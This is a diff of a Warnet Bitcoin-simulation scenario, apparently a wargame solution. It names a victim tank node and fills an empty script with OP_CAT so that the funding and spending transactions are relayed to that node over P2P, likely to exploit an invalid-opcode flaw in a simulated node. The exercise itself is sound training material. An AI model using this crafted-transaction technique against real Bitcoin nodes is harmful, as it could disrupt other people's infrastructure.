@@ -41,7 +41,7 @@ class Corn(Commander):
         parser.description = (
             "Demonstrate network reconnaissance using a scenario and P2PInterface"
         )
-        parser.usage = "warnet run /path/to/reconnaissance.py"
+        parser.usage = "warnet run /home/gabriel/projects/clusters/battle-of-galen-erso/scenarios/stub_invalidopcode.py"
 
     # Scenario entrypoint
     def run_test(self):
@@ -50,7 +50,7 @@ class Corn(Commander):
         # warnet run scenarios/miner_std.py --debug -- --interval=1
 
         node = self.nodes[0]
-        victim = "TARGET_TANK_NAME.default.svc"
+        victim = "tank-0037-coffee.default.svc"
 
         addr = socket.gethostbyname(victim)
         MAGIC_BYTES["signet"] = get_signet_network_magic_from_node(self.nodes[0])
@@ -66,7 +66,7 @@ class Corn(Commander):
 
         # FILL ME IN
         # PERHAPS WITH A FELINE OP_CODE??
-        script = CScript([])
+        script = CScript([OP_CAT])
 
         p2sh_address = script_to_p2sh(script)
         txid = node.sendtoaddress(p2sh_address, 0.0001)
@@ -86,7 +86,7 @@ class Corn(Commander):
             CTxIn(COutPoint(first_tx.sha256, 0), scriptSig=CScript([script]))
         )
         sec_tx.vout.append(
-            CTxOut(int(0.00009 * COIN), address_to_scriptpubkey(node.getnewaddress()))
+            CTxOut(1000, address_to_scriptpubkey(node.getnewaddress()))
         )
 
         for msg in [msg_tx(first_tx), msg_tx(sec_tx)]:
